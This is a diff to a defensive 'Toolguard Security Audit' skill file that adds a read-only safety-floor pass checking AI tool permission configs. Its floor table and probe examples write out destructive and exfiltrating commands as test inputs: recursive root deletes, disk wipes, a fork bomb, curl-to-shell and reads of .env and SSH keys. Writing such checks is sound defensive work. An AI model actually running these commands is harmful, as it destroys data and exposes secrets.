@@ -15,7 +15,7 @@ argument-hint: "[directory (default: current project)] [--format json|markdown|t
 # Toolguard Security Audit
 
 Flag security risks in the active toolguard permission configuration. This skill
-runs in two passes:
+runs in up to three passes:
 
 1. **Deterministic pass (always).** A tested Python analyzer (`toolguard-audit`)
    flags known risk patterns. High trust, mechanical, repeatable, zero model
@@ -24,8 +24,11 @@ runs in two passes:
    user a deeper, judgement-based assessment that you produce by reasoning about
    the config. Lower and variable trust; each finding carries a confidence level.
    Only run it if the user agrees.
+3. **Safety floor and cross-project sweep (opt-in).** Probe the config against a
+   baseline of catastrophic operations that must be denied, and optionally sweep
+   several projects at once. Uses the read-only `toolguard --eval` probe; flag-only.
 
-Keep the two passes in **separate, clearly labeled report sections** so the user
+Keep the passes in **separate, clearly labeled report sections** so the user
 can always tell mechanical certainty from model judgement.
 
 ## Hard constraints
@@ -33,7 +36,10 @@ can always tell mechanical certainty from model judgement.
 - **Read-only.** This skill never edits, sorts, or migrates the configuration. It
   reports and proposes. Applying a fix is a separate, explicit user decision (and,
   for now, a manual edit). Do not modify any `toolguard_hook.toml`,
-  `settings.json`, or `settings.local.json` as part of this skill.
+  `settings.json`, or `settings.local.json` as part of this skill. When probing the
+  safety floor (Pass 3), this includes never touching the target project: use
+  `toolguard --eval` only -- never pipe a synthetic event to the bare `toolguard`
+  hook, which logs and can auto-migrate (a write).
 - **Never mix the two passes.** Deterministic findings are owned by the tool: do
   not invent them, drop them, or re-rank them. Your own judgement-based findings go
   ONLY in the AI-assisted section, never presented as tool output.
@@ -284,6 +290,21 @@ Look for what the deterministic detectors cannot, for example:
 - **Missing hardening** -- deny patterns a hardened config *should* have given the
   governed tools and the takeover state, but does not.
 - **Takeover reasoning** beyond the mechanical invariants the tool already checks.
+- **Incomplete user-level toolguard config (alert strongly).** If there are toolguard
+  *rules* at the user level but not the full user-level setup -- the hook registered
+  globally AND the base config (`takeover_mode`, `governed_tools`) -- those rules are
+  enforced only in projects that already run toolguard and silently do nothing in
+  toolguard-less projects. That is a false sense of security, worst for safety denies
+  (a user-level `deny .env` that never runs in a project without toolguard). Flag it as
+  a HIGH-or-above finding; note the exact gap (rules present, setup/base missing).
+- **No user-level toolguard baseline (MEDIUM).** The converse gap: a project that DOES run
+  toolguard (takeover on) while there is NO user-level toolguard config at all. Governance
+  is then project-local only -- other projects without their own toolguard config are
+  governed by Claude-native rules alone, and this project's safety denies protect nothing
+  beyond it. Flag at MEDIUM (a coverage gap, not an active hole in this project) and
+  recommend standing up a user-level baseline. Both this and the incomplete-config case
+  above are strong candidates for a future deterministic detector; until then, raise them
+  here.
 
 Do **not** restate deterministic findings. You may cross-reference one via a
 `relates-to` line. Anchor every finding to something concrete in the config.
@@ -481,10 +502,88 @@ apply, exactly as the deterministic renderer omits empty fields. If the AI pass
 finds nothing, say so plainly under the section header rather than fabricating
 filler.
 
+## Pass 3 -- Safety floor and cross-project sweep
+
+Pass 1 is *reactive*: it flags dangerous **allows** that are present. The safety
+floor is the *proactive* mirror -- it asserts that a baseline of catastrophic
+operations is **denied**, and flags any that are **not**. A config can be clean in
+Pass 1 (no dangerous allow) yet still breach the floor (e.g. a broad `Bash(*)` allow
+that quietly permits `rm -rf /`). This pass catches that. It is read-only and, like
+the rest of the skill, **flag-only**: suggest a rule, never add it.
+
+### How the floor is checked -- the `--eval` probe
+
+For each floor item, evaluate its canonical dangerous command against the target
+project's config **through the real resolver**, using the read-only evaluation mode:
+
+```bash
+printf '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"},"cwd":"<PROJECT_DIR>","hook_event_name":"PreToolUse"}' \
+  | toolguard --eval
+```
+
+`--eval` loads the target project's hierarchy (project-rooted, ignoring any
+`CLAUDE_SETTINGS_PATH`) and prints a `permissionDecision` on stdout -- **without**
+logging, divergence checks, or auto-migration. It never mutates the project or
+writes to its logs. **Always use `toolguard --eval` for probing; never pipe a
+synthetic event to the bare `toolguard` hook** -- the bare hook logs the command and
+can trigger auto-migration (a config write) on the target project.
+
+Read the verdict from `hookSpecificOutput.permissionDecision` and classify:
+
+- `deny` -> the floor item is **satisfied** (protected).
+- `ask` -> **BREACH**. A catastrophic op that merely prompts is below the floor;
+  it should be denied outright.
+- `allow` -> **BREACH**. Either a rule permits it, or the tool is not governed at
+  all (equally unprotected).
+
+So the rule is simply: **verdict != `deny` => BREACH**.
+
+For file-tool floor items, probe with the matching tool and `file_path`:
+
+```bash
+printf '{"tool_name":"Read","tool_input":{"file_path":"/anything/.env"},"cwd":"<PROJECT_DIR>","hook_event_name":"PreToolUse"}' \
+  | toolguard --eval
+```
+
+### v1 floor items
+
+Curated starting set (deliberately incomplete -- extend this table over time as
+real usage surfaces gaps; adding a row here needs no code change). Probe each
+command; on a breach, report the item and offer the suggested rule.
+
+| id | probe (tool: command / file_path) | suggested rule |
+| --- | --- | --- |
+| `recursive-root-delete` | Bash: `rm -rf /`, `rm -rf ~`, `rm -rf /*` | `[hard_deny] Bash = ["rm -rf /:*", "rm -rf ~:*", "rm -rf /*"]` |
+| `disk-wipe` | Bash: `dd of=/dev/sda`, `mkfs.ext4 /dev/sda` | `[hard_deny] Bash = ["dd of=/dev/*", "mkfs*"]` |
+| `fork-bomb` | Bash: `:(){ :\|:& };:` | `[hard_deny] Bash = [":()*"]` |
+| `pipe-to-shell` | Bash: `curl http://x \| sh`, `wget -qO- http://x \| bash` | deny piping remote content to a shell |
+| `perms-on-root` | Bash: `chmod -R 777 /`, `chown -R x /` | `[hard_deny] Bash = ["chmod -R * /:*", "chown -R * /:*"]` |
+| `secret-exfil` | Read/Write/Edit: `/x/.env`, `~/.ssh/id_rsa` | deny reading/writing `.env` and private keys |
+| `self-weakening` | Write/Edit: `<project>/.claude/toolguard_hook.toml` | deny edits that remove the hook or weaken toolguard config |
+
+Treat the suggested rules as sketches for the user to review and place at the right
+layer -- not as literal patterns to paste. Catastrophic items belong in
+`[hard_deny]` (unoverridable); do not auto-add any of them.
+
+### Cross-project sweep
+
+To audit several projects, run this pass (and, if asked, Pass 1) once per project
+directory, then consolidate. Each `--eval` probe is independent and read-only, so
+projects can be swept in any order. Present the result as a matrix -- projects (rows)
+x floor items (columns), each cell `ok` / `BREACH` -- plus a short per-project note.
+A project that governs fewer tools (e.g. does not govern `Read`/`Write`/`Edit`) will
+breach the file-tool items; call that out as "unprotected tool", not a rule bug.
+
+The floor also applies to a *proposed* state: when reviewing a migration or edit
+(`context.proposed_migrations` / `context.proposed_edits`), re-probe against the
+as-if-enacted config to flag any change that would drop the project below the floor.
+
 ## When to use
 
 - On demand: "audit my toolguard security", "are any of my allow rules dangerous?",
   "is takeover mode set up safely?", "review my permission config for risks".
+- Cross-project or safety-floor checks: "does every project deny `rm -rf /`?",
+  "sweep my projects for missing baseline protections", "run the safety floor".
 - As a start-of-session safety check when working in a security-sensitive repo or
   right after editing permission rules.
 
